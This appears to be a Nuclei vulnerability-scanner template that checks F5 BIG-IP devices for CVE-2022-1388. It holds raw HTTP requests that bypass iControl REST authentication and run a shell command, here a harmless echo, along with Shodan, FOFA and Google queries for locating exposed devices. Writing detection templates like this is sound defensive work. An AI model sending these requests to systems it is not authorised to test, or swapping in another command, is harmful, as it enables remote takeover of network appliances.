http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - commandResult
    - 8831-2202-EVC
  matchers-condition: and
  raw:
  - "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {{Hostname}}\nConnection: keep-alive,\
    \ X-F5-Auth-Token\nX-F5-Auth-Token: a\nAuthorization: Basic {{base64(auth)}}\n\
    Content-Type: application/json\n\n{\n     \"command\": \"run\",\n     \"utilCmdArgs\"\
    : \"-c '{{cmd}}'\"\n}\n"
  - "POST /mgmt/tm/util/bash HTTP/1.1\nHost: localhost\nConnection: keep-alive, X-F5-Auth-Token\n\
    X-F5-Auth-Token: a\nAuthorization: Basic {{base64(auth)}}\nContent-Type: application/json\n\
    \n{\n     \"command\": \"run\",\n     \"utilCmdArgs\": \"-c '{{cmd}}'\"\n}\n"
  stop-at-first-match: true
id: CVE-2022-1388
info:
  author: dwisiswant0,Ph33r
  classification:
    cpe: cpe:2.3:a:f5:big-ip_access_policy_manager:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-1388
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-306
    epss-percentile: 0.99992
    epss-score: 0.94456
  description: 'F5 BIG-IP 16.1.x versions prior to 16.1.2.2, 15.1.x versions prior
    to 15.1.5.1, 14.1.x versions prior to 14.1.4.6, 13.1.x versions prior to 13.1.5,
    and all 12.1.x and 11.6.x versions, may allow undisclosed requests to bypass iControl
    REST authentication.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    bypass authentication and execute arbitrary code on the affected system.

    '
  metadata:
    fofa-query: title="big-ip&reg;-+redirect" +"server"
    google-query: intitle:"big-ip&reg;-+redirect" +"server"
    max-request: 2
    product: big-ip_access_policy_manager
    shodan-query:
    - http.title:"BIG-IP&reg;-+Redirect" +"Server"
    - http.title:"big-ip&reg;-+redirect" +"server"
    vendor: f5
    verified: true
  name: F5 BIG-IP iControl - REST Auth Bypass RCE
  reference:
  - https://twitter.com/GossiTheDog/status/1523566937414193153
  - https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/
  - https://support.f5.com/csp/article/K23605346
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388
  - https://www.secpod.com/blog/critical-f5-big-ip-remote-code-execution-vulnerability-patch-now/
  remediation: 'Apply the necessary security patches or updates provided by F5 Networks
    to mitigate this vulnerability.

    '
  severity: critical
  tags: cve,cve2022,f5,bigip,rce,mirai,kev,vkev,vuln
variables:
  auth: 'admin:'
  cmd: echo CVE-2022-1388 | rev
